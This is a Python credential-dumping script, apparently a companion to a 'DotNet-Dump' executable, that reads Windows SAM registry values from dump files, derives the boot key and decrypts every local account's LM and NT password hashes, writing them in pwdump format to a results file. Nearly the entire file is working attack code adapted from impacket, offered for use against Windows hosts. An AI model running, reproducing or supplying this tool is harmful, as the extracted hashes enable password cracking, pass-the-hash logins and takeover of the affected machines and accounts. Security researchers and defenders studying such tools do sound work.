# Patrick Sacchet
# Purpose of this script is to utilize output files from our DotNet-Dump executable and calculate user hashes (NTLM) with them
# Credit to impacket for a lot of this decryption; I merely put the pieces together: https://github.com/fortra/impacket

from ctypes import *
from binascii import unhexlify, hexlify
import hashlib
from impacket.structure import Structure
from impacket import ntlm
from six import b, PY2
from Cryptodome.Cipher import DES, ARC4, AES
from Cryptodome.Hash import MD5
from impacket.crypto import transformKey
from struct import pack
import os


# Where all our files are written 
dirPath = "C:\Windows\SysWOW64\out" # under WOW64 only because we are executing in a 32 bit context?
outFile = "results.txt"

class CryptoCommon:
    @staticmethod
    def deriveKey(baseKey):
        # 2.2.11.1.3 Deriving Key1 and Key2 from a Little-Endian, Unsigned Integer Key
        # Let I be the little-endian, unsigned integer.
        # Let I[X] be the Xth byte of I, where I is interpreted as a zero-base-index array of bytes.
        # Note that because I is in little-endian byte order, I[0] is the least significant byte.
        # Key1 is a concatenation of the following values: I[0], I[1], I[2], I[3], I[0], I[1], I[2].
        # Key2 is a concatenation of the following values: I[3], I[0], I[1], I[2], I[3], I[0], I[1]
        key = pack('<L',baseKey)
        key1 = [key[0] , key[1] , key[2] , key[3] , key[0] , key[1] , key[2]]
        key2 = [key[3] , key[0] , key[1] , key[2] , key[3] , key[0] , key[1]]
        if PY2:
            return transformKey(b''.join(key1)),transformKey(b''.join(key2))
        else:
            return transformKey(bytes(key1)),transformKey(bytes(key2))
        
    @staticmethod
    def decryptAES(key, value, iv=b'\x00'*16):
        plainText = b''
        if iv != b'\x00'*16:
            aes256 = AES.new(key,AES.MODE_CBC, iv)

        for index in range(0, len(value), 16):
            if iv == b'\x00'*16:
                aes256 = AES.new(key,AES.MODE_CBC, iv)
            cipherBuffer = value[index:index+16]
            # Pad buffer to 16 bytes
            if len(cipherBuffer) < 16:
                cipherBuffer += b'\x00' * (16-len(cipherBuffer))
            plainText += aes256.decrypt(cipherBuffer)

        return plainText

class USER_ACCOUNT_V(Structure):
    structure = (
        ('Unknown','12s=b""'),
        ('NameOffset','<L=0'),
        ('NameLength','<L=0'),
        ('Unknown2','<L=0'),
        ('FullNameOffset','<L=0'),
        ('FullNameLength','<L=0'),
        ('Unknown3','<L=0'),
        ('CommentOffset','<L=0'),
        ('CommentLength','<L=0'),
        ('Unknown3','<L=0'),
        ('UserCommentOffset','<L=0'),
        ('UserCommentLength','<L=0'),
        ('Unknown4','<L=0'),
        ('Unknown5','12s=b""'),
        ('HomeDirOffset','<L=0'),
        ('HomeDirLength','<L=0'),
        ('Unknown6','<L=0'),
        ('HomeDirConnectOffset','<L=0'),
        ('HomeDirConnectLength','<L=0'),
        ('Unknown7','<L=0'),
        ('ScriptPathOffset','<L=0'),
        ('ScriptPathLength','<L=0'),
        ('Unknown8','<L=0'),
        ('ProfilePathOffset','<L=0'),
        ('ProfilePathLength','<L=0'),
        ('Unknown9','<L=0'),
        ('WorkstationsOffset','<L=0'),
        ('WorkstationsLength','<L=0'),
        ('Unknown10','<L=0'),
        ('HoursAllowedOffset','<L=0'),
        ('HoursAllowedLength','<L=0'),
        ('Unknown11','<L=0'),
        ('Unknown12','12s=b""'),
        ('LMHashOffset','<L=0'),
        ('LMHashLength','<L=0'),
        ('Unknown13','<L=0'),
        ('NTHashOffset','<L=0'),
        ('NTHashLength','<L=0'),
        ('Unknown14','<L=0'),
        ('Unknown15','24s=b""'),
        ('Data',':=b""'),
    )

class DOMAIN_ACCOUNT_F(Structure):
    structure = (
        ('Revision','<L=0'),
        ('Unknown','<L=0'),
        ('CreationTime','<Q=0'),
        ('DomainModifiedCount','<Q=0'),
        ('MaxPasswordAge','<Q=0'),
        ('MinPasswordAge','<Q=0'),
        ('ForceLogoff','<Q=0'),
        ('LockoutDuration','<Q=0'),
        ('LockoutObservationWindow','<Q=0'),
        ('ModifiedCountAtLastPromotion','<Q=0'),
        ('NextRid','<L=0'),
        ('PasswordProperties','<L=0'),
        ('MinPasswordLength','<H=0'),
        ('PasswordHistoryLength','<H=0'),
        ('LockoutThreshold','<H=0'),
        ('Unknown2','<H=0'),
        ('ServerState','<L=0'),
        ('ServerRole','<H=0'),
        ('UasCompatibilityRequired','<H=0'),
        ('Unknown3','<Q=0'),
        ('Key0',':'),
# Commenting this, not needed and not present on Windows 2000 SP0
#        ('Key1',':', SAM_KEY_DATA),
#        ('Unknown4','<L=0'),
    )

class SAM_KEY_DATA(Structure):
    structure = (
        ('Revision','<L=0'),
        ('Length','<L=0'),
        ('Salt','16s=b""'),
        ('Key','16s=b""'),
        ('CheckSum','16s=b""'),
        ('Reserved','<Q=0'),
    )

class SAM_KEY_DATA_AES(Structure):
    structure = (
        ('Revision','<L=0'),
        ('Length','<L=0'),
        ('CheckSumLen','<L=0'),
        ('DataLen','<L=0'),
        ('Salt','16s=b""'),
        ('Data',':'),
    )

class SAM_HASH(Structure):
    structure = (
        ('PekID','<H=0'),
        ('Revision','<H=0'),
        ('Hash','16s=b""'),
    )

class SAM_HASH_AES(Structure):
    structure = (
        ('PekID','<H=0'),
        ('Revision','<H=0'),
        ('DataOffset','<L=0'),
        ('Salt','16s=b""'),
        ('Hash',':'),
    )

def MD5(data):
        md5 = hashlib.new('md5')
        md5.update(data)
        return md5.digest()

'''
* Take the bootkey we know and love and actually perform the transforms to get the real bootkey
* Input:
    * bootKeyValue - byte string of the bootkey (32AFC4...) taken from concatenating:
        * HKEY_LOCAL_MACHINE\\SYSTEM\\ControlSet%03d\\Control\\Lsa\\JD
        * HKEY_LOCAL_MACHINE\\SYSTEM\\ControlSet%03d\\Control\\Lsa\\Skew1
        * HKEY_LOCAL_MACHINE\\SYSTEM\\ControlSet%03d\\Control\\Lsa\\GBG
        * HKEY_LOCAL_MACHINE\\SYSTEM\\ControlSet%03d\\Control\\Lsa\\Data
* Return:
    * transformed bootkey
'''
def getRealBootKey(bootKeyValue):
        bootKey = b''

        transforms = [8, 5, 4, 2, 11, 9, 13, 3, 0, 6, 1, 12, 14, 10, 15, 7]
        tmpKey = unhexlify(bootKeyValue)

        for i in range(len(tmpKey)):
            bootKey += tmpKey[transforms[i]:transforms[i] + 1]

        return bootKey

'''
* Get the 'hashed' bootkey from our plaintext
* Input:
    * bootKey - transformed bootkey
    * fKeyValue - F value read from HKEY_LOCAL_MACHINE\\SAM\\SAM\\Domains\\Account\\F
* Return:
    * The hashed bootkey
'''
def getHBootKey(bootKey, fKeyValue):
        QWERTY = b"!@#$%^&*()qwertyUIOPAzxcvbnmQQQQQQQQQQQQ)(*@&%\0"
        DIGITS = b"0123456789012345678901234567890123456789\0"
        hashedBootKey = ""

        F = unhexlify(fKeyValue[:len(fKeyValue)-1])

        domainData = DOMAIN_ACCOUNT_F(F)

        if domainData['Key0'][0:1] == b'\x01':
            samKeyData = SAM_KEY_DATA(domainData['Key0'])

            rc4Key = MD5(samKeyData['Salt'] + QWERTY + bootKey + DIGITS)
            rc4 = ARC4.new(rc4Key)
            hashedBootKey = rc4.encrypt(samKeyData['Key']+samKeyData['CheckSum'])

            # Verify key with checksum
            checkSum = MD5( hashedBootKey[:16] + DIGITS + hashedBootKey[:16] + QWERTY)

            if checkSum != hashedBootKey[16:]:
                raise Exception('hashedBootKey CheckSum failed, Syskey startup password probably in use! :(')

        elif domainData['Key0'][0:1] == b'\x02':
            # This is Windows 2016 TP5 on in theory (it is reported that some W10 and 2012R2 might behave this way also)
            samKeyData = SAM_KEY_DATA_AES(domainData['Key0'])

            hashedBootKey = CryptoCommon.decryptAES(bootKey, samKeyData['Data'][:samKeyData['DataLen']], samKeyData['Salt'])

        return hashedBootKey

'''
* Decrypt either the NT or LM hash assuming its AES encrypted (new style)
* Input:
    * rid - this specific user's RID
    * cryptedHash - hash thats encrypted
    * bootkey - our updated bootkey 
    * newStyle - whether this hash is 'new' AKA has been encrypted via AES
* Return:
    * decrypted hash for this user
'''
def decryptHash(rid, cryptedHash, constant, bootkey, newStyle = False):
        Key1,Key2 = CryptoCommon.deriveKey(rid)

        Crypt1 = DES.new(Key1, DES.MODE_ECB)
        Crypt2 = DES.new(Key2, DES.MODE_ECB)

        if newStyle is False:
            rc4Key = MD5(bootkey[:0x10] + pack("<L",rid) + constant )
            rc4 = ARC4.new(rc4Key)
            key = rc4.encrypt(cryptedHash['Hash'])
        else:
            key = CryptoCommon.decryptAES(bootkey[:0x10], cryptedHash['Hash'], cryptedHash['Salt'])[:16]

        decryptedHash = Crypt1.decrypt(key[:8]) + Crypt2.decrypt(key[8:])

        return decryptedHash

'''
*  Dump the user hashes! Called after we grab all the info
* Input:
    * userRids - array of user RIDs taken from HKEY_LOCAL_MACHINE\\SAM\\SAM\\Domains\\Account\Users
    * userVKeys - array of user V values taken from HKEY_LOCAL_MACHINE\\SAM\\SAM\Domains\\Account\\Users\\<RID>\V
    * bootkey - hashed bootkey value
* Return:
    * N/A (we print all the hashes for all users passed in)
'''
def dump(userRids, userVKeys, bootkey):
    NTPASSWORD = b"NTPASSWORD\0"
    LMPASSWORD = b"LMPASSWORD\0"

    index = 0 # used to track where we are with our v values since they were both added in order

    # Dump our results to a file
    openFile = open(dirPath + "/" + outFile, "w")

    # Change this to array of our rid V values
    for rid in userRids:
        userAccount = USER_ACCOUNT_V(unhexlify(userVKeys[index][:len(userVKeys[index])-1]))
        rid = int(rid,16)

        V = userAccount['Data']

        userName = V[userAccount['NameOffset']:userAccount['NameOffset']+userAccount['NameLength']].decode('utf-16le')

        if userAccount['NTHashLength'] == 0:
            print('The account %s doesn\'t have hash information.' % userName)
            continue

        encNTHash = b''
        if V[userAccount['NTHashOffset']:][2:3] == b'\x01':
            # Old Style hashes
            newStyle = False
            if userAccount['LMHashLength'] == 20:
                encLMHash = SAM_HASH(V[userAccount['LMHashOffset']:][:userAccount['LMHashLength']])
            if userAccount['NTHashLength'] == 20:
                encNTHash = SAM_HASH(V[userAccount['NTHashOffset']:][:userAccount['NTHashLength']])
        else:
            # New Style hashes
            newStyle = True
            if userAccount['LMHashLength'] == 24:
                encLMHash = SAM_HASH_AES(V[userAccount['LMHashOffset']:][:userAccount['LMHashLength']])
            encNTHash = SAM_HASH_AES(V[userAccount['NTHashOffset']:][:userAccount['NTHashLength']])

        if userAccount['LMHashLength'] >= 20:
            lmHash = decryptHash(rid, encLMHash, LMPASSWORD, bootkey, newStyle)
        else:
            lmHash = b''

        if encNTHash != b'':
            ntHash = decryptHash(rid, encNTHash, NTPASSWORD, bootkey, newStyle)
        else:
            ntHash = b''

        if lmHash == b'':
            lmHash = ntlm.LMOWFv1('','')
        if ntHash == b'':
            ntHash = ntlm.NTOWFv1('','')

        answer =  "%s:%d:%s:%s:::" % (userName, rid, hexlify(lmHash).decode('utf-8'), hexlify(ntHash).decode('utf-8'))
        print(answer)
        openFile.write(answer + '\n')
        index += 1

def main():
    userRidValues = []
    userVValues = []

    # Grab our bootkey 
    bootKeyValue = open(dirPath + "/bootkey.txt", "r").readline()
    realBootKey = getRealBootKey(bootKeyValue[:32])

    # Get the hashed bootkey
    print("Getting hashed bootkey...")

    # Grab our F value
    fKeyValue = open(dirPath + "/fkey.txt", "r").readline()
    hBootKey = getHBootKey(realBootKey, fKeyValue)

    for file in os.listdir(dirPath):
        # Dont read the files we've read and dont need
        if (file != "fkey.txt" and file != "bootkey.txt"):
            userRidValues.append(file.strip(".txt"))
            userVValues.append(open(dirPath + "/" + file, "r").readline())

    print("Dumping creds...")

    # Pass over to dump 
    dump(userRidValues, userVValues, hBootKey)

    return


if __name__ == '__main__':
    main()